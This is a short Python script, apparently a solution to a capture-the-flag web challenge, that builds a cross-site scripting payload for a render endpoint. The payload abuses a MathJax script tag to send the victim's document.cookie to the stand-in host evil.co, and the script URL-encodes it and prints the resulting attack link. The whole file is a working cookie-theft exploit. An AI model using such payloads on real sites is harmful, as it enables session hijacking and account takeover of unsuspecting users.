import requests
from urllib.parse import quote_plus

URL = "https://mk.mc.ax/render?content="
payload = """<script src="https://mk.mc.ax/MathJax/MathJax.js">document.location='http://evil.co/abc?'+document.cookie;</script>"""
payload = URL+quote_plus(payload)
print(payload)